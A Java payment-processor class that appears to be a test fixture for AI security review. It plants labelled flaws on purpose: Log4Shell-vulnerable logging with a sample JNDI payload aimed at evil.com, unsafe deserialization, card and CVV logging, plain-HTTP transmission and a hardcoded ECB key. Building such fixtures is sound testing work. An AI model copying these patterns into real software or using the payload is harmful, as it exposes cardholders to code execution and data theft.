package com.example.payment;

import java.io.*;
import java.util.logging.*;
import org.apache.logging.log4j.LogManager;

/**
 * Payment Processing Service
 * 
 * TEST SCENARIO: AI should detect CVE patterns and PCI-DSS violations
 * - Log4j JNDI Injection (CVE-2021-44228)
 * - Unsafe Deserialization (CVE-2015-4852)
 * - PCI-DSS: Logging card data
 * - Insecure data transmission
 */
public class PaymentProcessor {
    
    // Using vulnerable Log4j version
    private static final org.apache.logging.log4j.Logger logger = LogManager.getLogger(PaymentProcessor.class);
    
    /**
     * VULNERABILITY: Log4j JNDI Injection (CVE-2021-44228)
     * AI CONTEXT TEST: Should detect user input in log message as CRITICAL
     * This is the famous Log4Shell vulnerability
     */
    public void processPayment(String merchantId, String userAgent, double amount) {
        // CRITICAL CVE-2021-44228: User-controlled data in log message
        // Attacker can send: ${jndi:ldap://evil.com/exploit}
        logger.info("Processing payment for merchant: " + merchantId);
        logger.info("User-Agent: " + userAgent);  // JNDI injection point!
        logger.debug("Amount: " + amount);
        
        // Process payment...
    }
    
    /**
     * VULNERABILITY: Unsafe Deserialization (CVE-2015-4852, CWE-502)
     * AI CONTEXT TEST: Should detect ObjectInputStream as dangerous
     */
    public Object loadPaymentData(byte[] serializedData) throws Exception {
        // CRITICAL: Deserializing untrusted data can lead to RCE
        ByteArrayInputStream bis = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bis);
        
        // Attacker can craft malicious serialized object (gadget chain)
        return ois.readObject();  // Remote Code Execution!
    }
    
    /**
     * VULNERABILITY: PCI-DSS Violation - Logging card data (CWE-532)
     * AI CONTEXT TEST: Should detect PCI-DSS compliance violation
     */
    public void logTransaction(String cardNumber, String cvv, String expiry, double amount) {
        // CRITICAL PCI-DSS VIOLATION: Never log full card numbers or CVV
        System.out.println("Transaction: Card=" + cardNumber + ", CVV=" + cvv + 
                          ", Expiry=" + expiry + ", Amount=" + amount);
        
        // Also writing to file - even worse!
        try {
            FileWriter fw = new FileWriter("transactions.log", true);
            fw.write("Card: " + cardNumber + ", CVV: " + cvv + "\n");
            fw.close();
        } catch (IOException e) {
            e.printStackTrace();  // Also bad: stack trace exposure
        }
    }
    
    /**
     * VULNERABILITY: Insecure HTTP for sensitive data (CWE-319)
     * AI CONTEXT TEST: Should detect HTTP instead of HTTPS for payment
     */
    public void sendToPaymentGateway(String cardData) throws Exception {
        // CRITICAL: Using HTTP for payment data - must be HTTPS
        java.net.URL url = new java.net.URL("http://payment-gateway.com/api/charge");
        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
        
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write(cardData.getBytes());
    }
    
    /**
     * VULNERABILITY: Hardcoded encryption key (CWE-321)
     * AI CONTEXT TEST: Should detect hardcoded crypto key
     */
    public byte[] encryptCardData(String cardNumber) throws Exception {
        // CRITICAL: Hardcoded encryption key
        String encryptionKey = "MySecretKey12345";  // Never hardcode keys!
        
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        // Also bad: ECB mode is insecure for most use cases
        
        javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(
            encryptionKey.getBytes(), "AES"
        );
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, keySpec);
        
        return cipher.doFinal(cardNumber.getBytes());
    }
}
